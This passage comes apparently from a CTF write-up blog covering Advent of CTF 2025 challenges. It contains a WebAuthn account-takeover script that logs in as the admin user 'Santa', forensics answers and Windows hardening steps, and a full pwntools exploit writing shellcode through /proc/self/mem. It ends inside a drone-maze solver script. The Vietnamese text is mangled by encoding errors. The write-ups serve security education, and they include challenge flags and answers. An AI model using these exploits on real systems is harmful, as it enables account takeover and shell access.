    let cred = await navigator.credentials.create({publicKey: opt.publicKey});

    // TR√ÅO T√äN TH√ÄNH SANTA
    let verifyPayload = {
        name: USER, // <--- VULNERABILITY HERE
        id: cred.id,
        rawId: bufToB64(cred.rawId),
        type: cred.type,
        response: {
            clientDataJSON: bufToB64(cred.response.clientDataJSON),
            attestationObject: bufToB64(cred.response.attestationObject)
        }
    };
    
    let rVer = await fetch("/api/webauthn/register/verify", {
        method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify(verifyPayload)
    });
    let verData = await rVer.json();
    console.log("Backdoor success! UserHandle:", verData.userHandle);

    // 2. ƒêƒÉng nh·∫≠p l·∫°i ngay l·∫≠p t·ª©c
    console.log("2. Logging in as Santa...");
    let rLogOpt = await fetch("/api/webauthn/auth/options", {method:"POST"});
    let logOpt = await rLogOpt.json();
    
    logOpt.publicKey.challenge = b64ToBuf(logOpt.publicKey.challenge);
    logOpt.publicKey.allowCredentials = [{
        id: cred.rawId, type:"public-key", transports:["usb","ble","nfc","internal"]
    }];

    // X√°c th·ª±c l·∫ßn 2 ƒë·ªÉ login
    let assert = await navigator.credentials.get({publicKey: logOpt.publicKey});
    
    let loginPayload = {
        name: USER, // Fix l·ªói 400
        userHandle: verData.userHandle,
        id: assert.id,
        rawId: bufToB64(assert.rawId),
        type: assert.type,
        response: {
            clientDataJSON: bufToB64(assert.response.clientDataJSON),
            authenticatorData: bufToB64(assert.response.authenticatorData),
            signature: bufToB64(assert.response.signature),
            userHandle: assert.response.userHandle ? bufToB64(assert.response.userHandle) : null
        }
    };

    await fetch("/api/webauthn/auth/verify", {
        method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify(loginPayload)
    });

    // 3. L·∫•y Flag
    let rAdmin = await fetch("/admin");
    let html = await rAdmin.text();
    let flag = html.match(/csd\{.*?\}/)[0];
    console.log("%c" + flag, "background:red;color:white;font-size:30px;padding:20px");
    alert(flag);
}
pwnSanta();
```

> **Flag:** `csd{1_L34rn3D_7h15_Fr0m_70m_5C077_84CK_1n_2020}`
{: .prompt-flag}

---

### Remediation

1.  **Kh√¥ng bao gi·ªù ƒë·ªÉ l·ªô Hash:** K·ªÉ c·∫£ khi m·ª•c ƒë√≠ch l√† `debug`. Hash c·ªßa d·ªØ li·ªáu c√≥ entropy th·∫•p (nh∆∞ m√£ PIN 4-6 s·ªë) t∆∞∆°ng ƒë∆∞∆°ng v·ªõi vi·ªác ƒë·ªÉ l·ªô Plaintext.
2.  **Verify Session:** Trong WebAuthn (ho·∫∑c b·∫•t k·ª≥ quy tr√¨nh ƒëƒÉng k√Ω n√†o), lu√¥n ph·∫£i l∆∞u tr·∫°ng th√°i ng∆∞·ªùi d√πng mu·ªën ƒëƒÉng k√Ω v√†o Session ph√≠a server ·ªü b∆∞·ªõc 1 (Options). ƒê·∫øn b∆∞·ªõc 2 (Verify), l·∫•y th√¥ng tin t·ª´ Session ra ƒë·ªÉ x·ª≠ l√Ω, **tuy·ªát ƒë·ªëi kh√¥ng tin t∆∞·ªüng d·ªØ li·ªáu `name` do client g·ª≠i l√™n**.
3.  **Strict Type Checking:** Ph√¢n bi·ªát r√µ r√†ng gi·ªØa `Santa` v√† `santa`.

---

## **Image Security**

**Score:** 85/100 (Passed)

**Platform:** Windows 11 Image (Aeacus Scoring Engine)

> **Category:** Forensics
{: .prompt-info}

You can view the original challenge here: **[Advent of CTF 2025 - Image Security](https://cyberstudents.net/advent/2025/challenges?challenge=cmj6k31n8001dk01624fpq9sf)**.

### **I. Forensics (Digital Forensics Investigation)**

#### Question 1: Decrypt the intercepted message
*   **Ciphertext:** `Xyebl V czkhijj klue go l qmueji'w tal? Tsmm ijy dshe yogcdg ssu qerr tpkhmjfki`
*   **Methodology:**
    1.  Based on the hint "very old cipher" and the text structure, I identified this as a **Vigen√®re Cipher**.
    2.  Utilized **CyberChef** (or dcode.fr) for analysis. You can view the full decoding recipe here: **[CyberChef Solution](https://cyberchef.org/#recipe=Vigen%C3%A8re_Decode('FREQANALYSIS')&input=WHllYmwgViBjemtoaWpqIGtsdWUgZ28gbCBxbXVlamkndyB0YWw/IFRzbW0gaWp5IGRzaGUgeW9nY2RnIHNzdSBxZXJyIHRwa2htamZraQ)**.
    3.  Key identified: **`FREQANALYSIS`** (Hinting at Frequency Analysis).
    4.  Decoded the text, revealing a quote from Shakespeare's Sonnet 18.
*   **Answer:** `Shall I compare thee to a summer's day? Thou art more lovely and more temperate`

#### Question 2: Startup Script Identification
*   **Methodology:**
    1.  Inspected **Task Manager** &rarr; **Startup Apps** tab.
    2.  Identified a suspicious executable named `jokehaha.exe` enabled at startup.
    3.  Verified the execution path via the **Details** tab (enabled Command Line column).
*   **Answer:** `jokehaha.exe`

#### Question 3: Reverse Engineering Encrypt Tool
*   **Artifact:** `encrypt.exe` found on the Desktop.
*   **Analysis:**
    1.  **Identification:** Identified the file as a **PyInstaller** packed executable using `Detect It Easy (DiE)` and string analysis.
    2.  **Extraction:** Used **`pyinstxtractor.py`** to extract the contents and retrieved the bytecode file `encrypt.pyc`.
    3.  **Decompilation:** Used **`pycdc.exe` (Decompyle++)** to decompile the `.pyc` file back to the original Python source code.

    **Decompiled Code Result:**
    ```python
    # Source Generated with Decompyle++
    # File: encrypt.pyc (Python 3.11)
    import base64

    def e(t):
        p = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97]
        k = 165
        b = []
        for i, c in enumerate(t):
            a = ord(c)
            m = p[i % len(p)]
            x = a * m ^ k  # Encryption Logic
            b.append(x.to_bytes(2, 'big'))
        return base64.b64encode(b''.join(b)).decode('utf-8')
    ```

    4.  **Decryption Logic:**
        *   Encryption Algorithm: `x = (ASCII * Prime) XOR Key`.
        *   Decryption Algorithm (Inverse): `ASCII = (Encoded_Value XOR Key) / Prime`.
        *   I wrote a Python script to reverse the process and retrieve the flag.

	    ```python
	    import base64
	
	    # Encrypted string from the challenge
	    encoded_str = "AEUBzgKoA6cEVAVBBtQIoQkRC9QNaw9kE8QQ0xIuFvkZMBy7GsobGRwhHnk="
	    
	    # Constants extracted from decompiled code
	    p = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97]
	    k = 165
	
	    # Step 1: Decode Base64 to bytes
	    data_bytes = base64.b64decode(encoded_str)
	
	    ans = ""
	
	    # Step 2: Iterate through every 2 bytes (Big Endian format)
	    for i in range(0, len(data_bytes), 2):
	        chunk = data_bytes[i:i+2]
	        
	        # Convert bytes to integer
	        x = int.from_bytes(chunk, 'big')
	
	        # Calculate index to find the corresponding prime number
	        char_index = i // 2
	        m = p[char_index % len(p)]
	
	        # Inverse logic: 
	        # Original: x = (a * m) ^ k
	        # Reverse:  a = (x ^ k) // m
	        val_after_xor = x ^ k
	        ascii_val = val_after_xor // m
	
	        ans += chr(ascii_val)
	
	    print("Decoded message:", ans)
	    ```

*   **Answer:** `pyinstallermybeloveddd`

---

### **II. User & Group Management**
**Objective:** Ensure only authorized users (per README) have system access, remove unauthorized accounts, and enforce the Principle of Least Privilege.

**Remediation Steps:**

#### 1. Remove Unauthorized User
*   **Finding:** Identified user **`Grinch`**, who was not listed in the "Authorized Users" or "Administrators" section of the README.
*   **Action:**
    *   Executed command via CMD (Admin):
        ```cmd
        net user Grinch /delete
        ```
    *   *(Alternative: `lusrmgr.msc` &rarr; Users &rarr; Right-click `Grinch` &rarr; Delete).*

#### 2. Disable Built-in Administrator
*   **Rationale:** The default `Administrator` account has a well-known SID and is a primary target for brute-force attacks. The `Santa` and `Elf` accounts are designated for administration.
*   **Action:**
    *   Executed command via CMD (Admin):
        ```cmd
        net user Administrator /active:no
        ```
    *   Verified that the account is disabled.

#### 3. Password Management
Based on the *Authorized Administrators* and *Authorized Users* list in the README:

*   **A. Restore Administrator Passwords (Santa & Elves):**
    *   **Rationale:** The README warned that authorized passwords might have been changed. Resetting them ensures authorized access control.
    *   **Action:** Reset passwords for `Santa`, `Elf1`, `Elf2`, `Elf3`, and `Elf4` to the specific values provided in the README.
        ```cmd
        net user Santa "Chr157m45C4r0l5!"
        net user Elf1 "M3rryChr157m45"
        net user Elf2 "W0rk1ngH4rd."
        net user Elf3 "Santa1"
        net user Elf4 "1ts_71M333!"
        ```

*   **B. Enforce Strong Passwords for Standard Users:**
    *   **Rationale:** Standard users (`Buddy`, `Kevin`, `Frosty`) had weak or unknown passwords.
    *   **Action:** Set new, complex passwords (Length > 10, utilizing uppercase, lowercase, numbers, and special characters).
        ```cmd
        net user Buddy "P@ssw0rd123!"
        net user Kevin "P@ssw0rd123!"
        net user Frosty "P@ssw0rd123!"
        ```
    * *(Note: `P@ssw0rd123!` is used here as an example of a compliant, complex password).*
#### 4. Audit Administrators Group
*   **Rationale:** Enforce Least Privilege. Standard users must not have administrative rights.
*   **Action:**
    *   Navigated to `lusrmgr.msc` &rarr; **Groups** &rarr; **Administrators**.
    *   **Removed:** `Administrator`, `Guest`, and any standard users (e.g., `Kevin`, `Buddy`) found in the group.
    *   **Retained:** Only `Santa`, `Elf1`, `Elf2`, `Elf3`, and `Elf4`.

---

### **III. Password & Account Lockout Policy**
**Objective:** Enforce strict password requirements and automated lockout mechanisms to mitigate brute-force and dictionary attacks.

**Tool:** `secpol.msc` (Local Security Policy) &rarr; **Account Policies**.

#### 1. Password Policy
*   **Maximum password age:** Set to **42** or **90** days.
    *   *Rationale:* Ensures periodic password rotation; limits the window of opportunity for compromised credentials.
*   **Minimum password age:** Set to **1** day.
    *   *Rationale:* Prevents users from cycling through passwords immediately to reuse old ones.
*   **Minimum password length:** Set to **10 - 12** characters.
    *   *Rationale:* Increases the complexity for password cracking tools exponentially.
*   **Enforce password history:** Set to **5** passwords remembered.
    *   *Rationale:* Prevents password reuse.
*   **Password must meet complexity requirements:** **Enabled**.
    *   *Rationale:* Mandates the use of complex character combinations (Uppercase, Lowercase, Numbers, Symbols).
	    ![image](/assets/img/Advent-CTF-2025/day15_1.png){: .mx-auto .d-block }

#### 2. Account Lockout Policy
*   **Account lockout threshold:** Set to **5** invalid logon attempts.
    *   *Rationale:* Locks the account after 5 failures, stopping automated brute-force attacks effectively.
*   **Account lockout duration:** Set to **30** minutes.
    *   *Rationale:* Forces attackers to wait, significantly slowing down the attack.
*   **Reset account lockout counter after:** Set to **30** minutes.
    *   *Rationale:* The counter resets after 30 minutes if no further failed attempts occur.
	    ![image](/assets/img/Advent-CTF-2025/day15_2.png){: .mx-auto .d-block }

---

### **IV. Audit Policy**
**Objective:** Enable logging for critical system events (logons, policy changes, account management) to facilitate security monitoring and incident response (Digital Forensics).

**Tool:** `secpol.msc` &rarr; **Local Policies** &rarr; **Audit Policy**.

**Detailed Configuration:**

*   **Audit account logon events:**
    *   *Configuration:* **Success, Failure**.
    *   *Rationale:* Logs each time a user account is authenticated by this computer (crucial for detecting **Brute-force attacks**).
*   **Audit account management:**
    *   *Configuration:* **Success, Failure**.
    *   *Rationale:* Logs user creation, deletion, password changes, or group membership modifications (detects unauthorized account manipulation).
*   **Audit logon events:**
    *   *Configuration:* **Success, Failure**.
    *   *Rationale:* Logs when a user logs on or logs off the system directly.
*   **Audit policy change:**
    *   *Configuration:* **Success, Failure**.
    *   *Rationale:* Alerts if security policies are intentionally modified (e.g., disabling Audit logging or weakening Password Policy).
*   **Audit object access:**
    *   *Configuration:* **Success, Failure**.
    *   *Rationale:* Tracks access to critical files, folders, or registry keys (requires SACL configuration on specific objects).

	    ![image](/assets/img/Advent-CTF-2025/day15_3.png)
---

### **V. Local Policies & Security Options**
**Objective:** Harden system security settings to prevent Man-in-the-Middle (MitM) attacks, credential dumping, and information disclosure.

**Tool:** `secpol.msc` &rarr; **Local Policies** &rarr; **Security Options**.

#### 1. Hardening Network Communications - SMB Signing
*   **Configuration:**
    *   `Microsoft network client: Digitally sign communications (always)` &rarr; **Enabled**.
    *   `Microsoft network server: Digitally sign communications (always)` &rarr; **Enabled**.
*   **Technical Explanation:**
    *   Enforces packet signing for all SMB traffic.
    *   Prevents **SMB Relay** and **Man-in-the-Middle** attacks.

#### 2. Hardening Logon Process - Hide Last User Information
*   **Configuration:**
    *   `Interactive logon: Don't display last signed-in` &rarr; **Enabled**.
*   **Technical Explanation:**
    *   Prevents Windows from displaying the username of the last logged-in user.
    *   Attackers with physical access must guess both the **Username** and **Password**.

#### 3. Hardening Credential Protection - Disable Credential Caching
*   **Configuration:**
    *   `Network access: Do not allow storage of passwords and credentials for network authentication` &rarr; **Enabled**.
*   **Technical Explanation:**
    *   Prevents the OS from caching network credentials.
    *   Mitigates credential dumping attacks (e.g., via tools like Mimikatz).

---

### **VI. Service Auditing**
**Objective:** Reduce the Attack Surface by disabling unnecessary, risky, or legacy services.

**Remediation Steps:**

#### 1. Disable Microsoft FTP Service (Critical)
*   **Finding:** Service **`ftpsvc`** was Running.
*   **Risk:** FTP uses clear-text transmission, exposing credentials and data.
*   **Action:**
    *   **Method 1 (GUI):** `services.msc` &rarr; Microsoft FTP Service &rarr; Stop &rarr; Startup Type: **Disabled**.
    *   **Method 2 (PowerShell Admin):**
        ```powershell
        Stop-Service "ftpsvc" -Force
        Set-Service "ftpsvc" -StartupType Disabled
        ```

#### 2. Disable Print Spooler
*   **Finding:** Service **`Spooler`** was Running.
*   **Risk:** The Print Spooler is vulnerable to exploits (e.g., PrintNightmare) and is unnecessary on a non-print server.
*   **Action:** Stopped and set Startup Type to **Disabled**.

#### 3. Verify Other Risky Services
*   **Action:** Verified the following services were disabled:
    *   **SSDP Discovery (`SSDPSRV`):** Disabled (UPnP risk).
    *   **Remote Registry (`RemoteRegistry`):** Disabled (Remote modification risk).
    *   **Telnet (`TlntSvr`):** Not installed.

#### 4. Disable File and Printer Sharing
*   **Finding:** The **`LanmanServer`** service was running, allowing SMB file sharing.
*   **Action:**
    *   **GUI:** Disabled "File and printer sharing" in *Advanced sharing settings*.
		    ![image](/assets/img/Advent-CTF-2025/day15_4.png)
    *   **Service Level:** Navigated to `services.msc`, stopped and **Disabled** the **Server** (`LanmanServer`) service to completely prevent the machine from acting as a file server.

---
### **VII. Software Audit**

#### 1. Unwanted Software Removal
*   **Action:** Identified and uninstalled prohibited applications found on the system.
    *   **Removed:** **Wireshark** (Network protocol analyzer - Classified as a "hacking tool").
    *   **Removed:** **Discord** (Non-business communication application).

#### 2. Software Updates
*   **Requirement:** The README explicitly stated that critical applications must be kept up to date.
*   **Action:** Checked current versions and updated **Notepad++** and **7-Zip** to the latest stable releases to patch known vulnerabilities and ensure software integrity.

---

### **VIII. Application Security & Hardening**

#### 1. Remote Desktop (RDP) and Remote Assistance Configuration
**Objective:** Enable the RDP service (Critical Service) to ensure availability, but enforce the highest security standard (NLA) and disable the Remote Assistance feature to reduce the attack surface.

**Remediation Steps:**

1.  **Open Remote Configuration:**
    *   Press `Windows + R` to open the Run dialog.
    *   Type command: `sysdm.cpl` and press **Enter**.
    *   In the *System Properties* window that appears, select the **Remote** tab.

2.  **Disable Remote Assistance:**
    *   In the *Remote Assistance* section (top), **UNCHECK** the box: **"Allow Remote Assistance connections to this computer"**.
    *   *Rationale:* This feature is often exploited by attackers to gain control or for Social Engineering attacks, so it should be disabled if not in use.

3.  **Enable and Configure Remote Desktop (RDP):**
    *   In the *Remote Desktop* section (bottom):
    *   Select the radio button: **"Allow remote connections to this computer"** (To enable the service).
    *   **IMPORTANT:** Check the box immediately below: **"Allow connections only from computers running Remote Desktop with Network Level Authentication (recommended)"**.
    *   *Rationale:* **NLA (Network Level Authentication)** mandates user authentication before the RDP session is established, helping to prevent Man-in-the-Middle attacks and reducing server load.

	    ![image](/assets/img/Advent-CTF-2025/day15_5.png){: .mx-auto .d-block }

#### 2. Windows Features
*   Disabled **SMB 1.0/CIFS** (Legacy protocol vulnerability).
*   Disabled **Telnet Client**, **TFTP Client**.
*   Disabled **Media Features** (Windows Media Player).

#### 3. Defensive Countermeasures
*   Enabled **Windows Defender Real-time Protection**.
*   Enabled **SmartScreen** (Reputation-based protection) and **PUA** (Potentially Unwanted Apps) blocking.

#### 4. Remediating Malicious Antivirus Exclusions
*   **Finding:** Malicious exclusions were configured in Windows Defender (excluding `.exe` extensions and the `C:\` drive).
*   **Risk:** This allowed malware to bypass AV scans.
*   **Action:** Removed all malicious exclusions. Retained only the exclusion for the Scoring Engine (`C:\aeacus`).

---

### **IX. Malware Removal & Prohibited Files**

#### 1. Malware Eradication
*   **Startup Malware:** Removed `jokehaha.exe` and `fake-flag-child.ps1` from startup items.
*   **Hidden Malware:**
    *   Identified and removed malicious files via Virus & Threat Protection Scan.
    *   Identified and removed **`Seatbelt.exe`** (Reconnaissance tool) in `C:\Windows\Temp`.
	    ![image](/assets/img/Advent-CTF-2025/day15_6.png){: .mx-auto .d-block }
    *   Purged all contents of `C:\Windows\Temp`.
    *   Identified and removed **`winloader.exe`** (Backdoor) in `C:\Windows\System32`.
	    ![image](/assets/img/Advent-CTF-2025/day15_7.png){: .mx-auto .d-block }
#### 2. Prohibited File Removal
*   Located and removed unauthorized archives (`.zip`) containing hacking tools and games in the `Downloads` folders of users `Elf1` and `Elf2`.
	    ![image](/assets/img/Advent-CTF-2025/day15_8.png){: .mx-auto .d-block }

---
**Result:**

![image](/assets/img/Advent-CTF-2025/result_day15.png){: .mx-auto .d-block }


> **Flag:** `csd{5L4Y_R1d3_15_0v3r_r4t3d_lf1LQ1m7}`
{: .prompt-flag}

---

## FrostByte

### **Initial Analysis (Reconnaissance)**

#### Basic Information
*   **Functionality:** The program allows the user to input a filename, an offset, and **exactly 1 byte** of data. It then opens the file, seeks to that offset, writes the byte, and exits.
*   **Protections (Checksec):**
    *   `No PIE`: Code addresses are fixed (most critical factor).
    *   `NX Enabled`: Stack is not executable (we must write shellcode to an executable section).
    *   `Canary found`: Stack buffer overflow protection is present (though we won't be smashing the stack in this challenge).

#### Vulnerability
The challenge hint states: *"You shouldn't be writing to normal files. What is a special file you can use?"*

The vulnerability lies in the fact that the program allows writing to any file the user has permission to access. In Linux, the pseudo-file `/proc/self/mem` represents the entire virtual memory of the current process.
=> **Exploitation:** We can open `/proc/self/mem` to overwrite the program's own running code (the `.text` section), bypassing the default Read-Only permission.

### **Exploitation Strategy**

The biggest challenge is that the program only allows writing **1 byte** before exiting. To exploit this, we need to execute the following sequence of steps:

1.  **Resurrection:** Force the program to restart after finishing execution to gain extra write opportunities.
2.  **Create an Infinite Loop:** Modify the program flow into an infinite loop to allow arbitrary writes (writing as many bytes as needed).
3.  **Inject Shellcode:** Write malicious code into an executable memory region.
4.  **Trigger:** Redirect the execution flow (EIP/RIP) to jump into the Shellcode.

## **Technical Deep Dive**

#### **Stage 1: Resurrection via** `.fini_array`
*   **Theory:** When the `main` function returns, `libc` iterates through and calls destructors stored in the `.fini_array` section.
*   **Implementation:** We overwrite 1 byte at the address of `.fini_array` (`0x403df0`) to point it back to the address of the `main` function (`0x4012b5`).
*   **Result:** Instead of exiting, the program re-runs `main` one more time. We gain one extra "life".

#### **Stage 2: Constructing a Recursive Loop**
This is the most difficult part. We need to patch the code in `main` so that it calls itself recursively forever. We target the `call puts` instruction at the end of `main` (`0x4013d8`).
The jump offset for the `call` instruction is calculated relative to the next instruction's address (`0x4013dd`).

*   **The Problem:** To jump back to `main` (`0x4012b5`), the required offset is `0xFFFF FED9` (`-295`). We need to patch 2 bytes (`FD 13` &rarr; `FE D9`). However, we can only write one byte at a time. If we write one byte and the resulting intermediate opcode is invalid, the program will crash immediately.
*   **The Solution - Safe Bridge:**
    1.  **Run 2 (Patch Low Byte):** Change `0x13` &rarr; `0xD9`.
        *   Temporary Destination: `0x4013dd + 0xFFFF FDD9 = 0x4011b6`.
        *   At `0x4011b6`, there is a `mov rdx, rsp` instruction inside the `_start` function. This is a **safe entry point**; it re-initializes registers and calls `main` again without corrupting the Stack.
    2.  **Run 3 (Patch High Byte):** Change `0xFD` &rarr; `0xFE`.
        *   Final Destination: `0x4013dd + 0xFFFF FED9 = 0x4012b6`.
        *   Address `0x4012b6` is `main+1`. It effectively skips the `endbr64` instruction (which is harmless acting as a NOP here) and proceeds directly to `push rbp`.
        *   **Result:** `main` calls `main`. The stack grows, but slowly enough that we can write thousands of bytes without crashing.

#### **Stage 3: Writing Shellcode**
*   **Location:** The `setup` function (`0x401296`). This function is no longer used, has a fixed address, and resides in the `.text` section (which has `r-x` permissions).
*   **Payload:** A compact `execve("/bin/sh", 0, 0)` shellcode (23 bytes).

#### **Stage 4: Trigger**
*   After the shellcode is written, we patch the `call` instruction in the loop one last time.
*   **Goal:** Jump to `setup` (`0x401296`).
*   **Offset:** `0x401296 - 0x4013dd = 0xFFFF FEB9`.
*   We only need to change the low byte from `0xD9` &rarr; `0xB9`. The high byte `0xFE` is already correct from the previous stage.

### **Exploit Script**

```python
from pwn import *

# --- Configuration ---
context.binary = elf = ELF('./frostbyte')
context.log_level = 'info'

p = process('./frostbyte')
# p = remote('ctf.csd.lol', 8888)

def write_byte(addr, byte_val):
    """
    Helper function to write 1 byte to any address
    via the /proc/self/mem vulnerability.
    """
    # Send the special file path
    p.sendlineafter(b': ', b'/proc/self/mem')
    # Send the memory address (offset)
    p.sendlineafter(b': ', str(addr).encode())
    # Send the data byte
    p.sendafter(b': ', p8(byte_val))

# =================================================================
# STAGE 1: RESURRECTION
# =================================================================
# Patch .fini_array to point back to main (LSB: 0xB5)
fini_addr = 0x403df0 
log.info(f"[-] Patching .fini_array ({hex(fini_addr)}) -> 0xb5")
write_byte(fini_addr, 0xb5)
log.success("=> Main resurrected successfully.")

# =================================================================
# STAGE 2: CREATE INFINITE LOOP
# =================================================================
# Goal: Patch 'call puts' (0x4013d8) to become 'call main+1'.
# Low byte offset of the call instruction
call_offset_low = 0x4013d9
# High byte offset of the call instruction
call_offset_high = 0x4013da

# Step 2.1: Create a Safe Bridge
# Patch low byte to 0xD9 -> Jumps to _start+6 (0x4011b6)
# This prevents the program from crashing while the offset is partially patched.
log.info("[-] Patching Call Low Byte -> 0xD9 (Bridge to _start)")
write_byte(call_offset_low, 0xD9)

# Step 2.2: Finalize Recursive Loop
# Patch high byte to 0xFE -> Combined with 0xD9, target becomes 0x4012b6 (main+1)
log.info("[-] Patching Call High Byte -> 0xFE (Recursive Main Loop)")
write_byte(call_offset_high, 0xFE)
log.success("=> Infinite Recursive Loop Established!")

# =================================================================
# STAGE 3: CODE INJECTION (Shellcode)
# =================================================================
# Write shellcode into the 'setup' function (0x401296)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
target_code_addr = 0x401296 

log.info(f"[-] Writing shellcode to {hex(target_code_addr)}...")
for i in range(len(shellcode)):
    write_byte(target_code_addr + i, shellcode[i])
log.success("=> Shellcode written.")

# =================================================================
# STAGE 4: TRIGGER
# =================================================================
# Patch the call instruction to jump to Shellcode (Setup)
# Target offset: FE B9
# Current: FE D9. We only need to change low byte D9 -> B9.
log.info("[-] Redirecting execution to shellcode...")
write_byte(call_offset_low, 0xB9)

# Clean buffer to display shell output clearly
p.clean()

p.interactive()
```

> **Flag:** `csd{f1L3sYSt3M_CFH_1S_l0wK3nu1N3lY_fun_3af185}`
{: .prompt-flag}

### **Key Takeaways**
1.  **`/proc/self/mem` is extremely powerful:** It allows bypassing write permissions on Read-Only memory regions (like `.text`), which is a crucial technique when dealing with No-PIE binaries.
2.  **Patching Code:** Modifying machine code (opcodes) directly at runtime requires absolute precision. One wrong byte results in a SIGSEGV.
3.  **Intermediate Jumps:** When patching a large jump offset (multi-byte), you must find a "temporary safe harbor" (Safe Bridge) to ensure the program doesn't crash in the intermediate state.
4.  **Infinite Loop:** In challenges with limited input iterations, the top priority is always to establish an infinite loop.

---

## Guide My Drone Tonight
> **Category:** Reverse Engineering
{: .prompt-info}

### Recon
ƒê·ªÅ b√†i cung c·∫•p m·ªôt file binary t√™n l√† `client` v√† m·ªôt server `nc ctf.csd.lol 6969`.
Khi ch·∫°y th·ª≠ `client`, n√≥ k·∫øt n·ªëi ƒë·∫øn server, in ra "Connected successfully!", sau ƒë√≥ drone di chuy·ªÉn lung tung kh√¥ng c√≥ m·ª•c ƒë√≠ch v√† k·∫øt n·ªëi b·ªã ƒë√≥ng.

**Ki·ªÉm tra file:**
```bash
$ file client
client: ELF 64-bit LSB pie executable, x86-64...
```
ƒê√¢y l√† file th·ª±c thi tr√™n Linux 64-bit, Little Endian.

### Static Analysic
S·ª≠ d·ª•ng Ghidra/IDA ƒë·ªÉ decompile, ta t·∫≠p trung v√†o h√†m x·ª≠ l√Ω ch√≠nh `FUN_001013ad`.

#### a. Ph√¢n t√≠ch Giao th·ª©c (Protocol)
Server v√† Client giao ti·∫øp qua c√°c g√≥i tin binary c√≥ c·∫•u tr√∫c Header (8 bytes) nh∆∞ sau:
```c
struct Header {
    uint32_t magic;   // 0x53504d4b ("KMPS" - Little Endian)
    uint8_t  type;    // Th∆∞·ªùng l√† 1
    uint8_t  cmd;     // Command ID (1, 2, 3, 4)
    uint16_t length;  // T·ªïng ƒë·ªô d√†i g√≥i tin
};
```

#### b. Ph√¢n t√≠ch l·ªói logic c·ªßa Client m·∫´u
Trong v√≤ng l·∫∑p ch√≠nh, client nh·∫≠n g√≥i tin tr·∫°ng th√°i t·ª´ server (Command 2 response).
```c
// Decompiled logic
recv(fd, buf, 16); // Nh·∫≠n 16 bytes header + metadata
// Client m·∫´u ƒë·ªçc d·ªØ li·ªáu t·ª´ offset 8 v√† 12
cur_id = *(int*)(buf + 8);
count  = *(int*)(buf + 12);
// ... sau ƒë√≥ ch·ªçn h√†ng x√≥m ƒë·∫ßu ti√™n ƒë·ªÉ ƒëi
```
**V·∫•n ƒë·ªÅ ph√°t hi·ªán:**
1.  Client m·∫´u **b·ªè qua 8 bytes ƒë·∫ßu ti√™n** c·ªßa g√≥i tin (offset 0-7).
2.  Client m·∫´u di chuy·ªÉn "m√π" (ch·ªçn `neighbors[0]`), d·∫´n ƒë·∫øn vi·ªác ƒëi l√≤ng v√≤ng.

#### c. T√¨m ƒê√≠ch ƒë·∫øn (The Hidden Target)
ƒê·ªÉ gi·∫£i m√™ cung, ta c·∫ßn bi·∫øt ƒë√≠ch ƒë·∫øn. C√≥ 2 manh m·ªëi:
1.  D·ªØ li·ªáu b·ªã b·ªè qua ·ªü Offset 0 c√≥ th·ªÉ l√† Target ID? (Th·ª≠ nghi·ªám th·ª±c t·∫ø: Kh√¥ng ph·∫£i, ƒë√≥ ch·ªâ l√† ID r√°c ho·∫∑c padding).
2.  **Command 4:** Trong binary c√≥ nh·∫Øc ƒë·∫øn Command 4. Khi th·ª≠ g·ª≠i Command 4 ngay sau khi k·∫øt n·ªëi, Server tr·∫£ v·ªÅ m·ªôt chu·ªói vƒÉn b·∫£n:
    > *"Reach 0x[TARGET_ID] to get the flag."*

=> **Chi·∫øn thu·∫≠t:** G·ª≠i Cmd 4 ƒë·ªÉ l·∫•y Target ID, sau ƒë√≥ d√πng thu·∫≠t to√°n t√¨m ƒë∆∞·ªùng.

### Exploit

#### a. X·ª≠ l√Ω T·ªça ƒë·ªô (Coordinate System)
ID c·ªßa c√°c node l√† s·ªë nguy√™n 32-bit. Trong c√°c b√†i to√°n l∆∞·ªõi (grid), ID th∆∞·ªùng ƒë∆∞·ª£c pack t·ª´ t·ªça ƒë·ªô `(x, y)`.
*   16 bit cao: `X`
*   16 bit th·∫•p: `Y`
V√¨ b·∫£n ƒë·ªì r·∫•t r·ªông, t·ªça ƒë·ªô c√≥ th·ªÉ √¢m. C·∫ßn parse theo d·∫°ng **Signed 16-bit Integer**:
```python
def get_pos(node_id):
    x = (node_id >> 16) & 0xFFFF
    y = node_id & 0xFFFF
    if x > 32767: x -= 65536 # X·ª≠ l√Ω s·ªë √¢m
    if y > 32767: y -= 65536
    return x, y
```

#### b. Thu·∫≠t to√°n t√¨m ƒë∆∞·ªùng (Pathfinding)
Ban ƒë·∫ßu, s·ª≠ d·ª•ng thu·∫≠t to√°n **Greedy** (lu√¥n ch·ªçn ƒëi·ªÉm g·∫ßn ƒë√≠ch nh·∫•t) s·∫Ω g·∫∑p v·∫•n ƒë·ªÅ "Dao ƒë·ªông" (Oscillation): Drone ƒëi A &rarr; B, r·ªìi t·∫°i B th·∫•y A g·∫ßn ƒë√≠ch h∆°n l·∫°i quay v·ªÅ A &rarr; L·∫∑p v√¥ t·∫≠n.

**Gi·∫£i ph√°p t·ªëi ∆∞u:** Greedy k·∫øt h·ª£p "Tr√≠ nh·ªõ" (Penalty for Visited Nodes).
*   L∆∞u s·ªë l·∫ßn ƒë√£ ƒëi qua m·ªói node (`visited_count`).
*   C√¥ng th·ª©c ch·ªçn ƒë∆∞·ªùng:
    `Score = Kho·∫£ng_c√°ch_t·ªõi_ƒë√≠ch + (S·ªë_l·∫ßn_ƒë√£_gh√© * 100,000)`
*   N·∫øu m·ªôt ƒë∆∞·ªùng c·ª•t khi·∫øn drone quay l·∫°i, ƒëi·ªÉm ph·∫°t s·∫Ω tƒÉng l√™n, √©p drone ph·∫£i r·∫Ω sang h∆∞·ªõng kh√°c (d√π xa h∆°n) v√†o l·∫ßn t·ªõi.

### Script

```python
from pwn import *
import math
import struct
import time
import re
from collections import defaultdict

# C·∫•u h√¨nh
context.log_level = 'info'
MAGIC = 0x53504d4b 

def get_pos(node_id):
    x = (node_id >> 16) & 0xFFFF
    y = node_id & 0xFFFF
    if x > 32767: x -= 65536
    if y > 32767: y -= 65536
    return x, y

def dist(id1, tx, ty):
    x1, y1 = get_pos(id1)
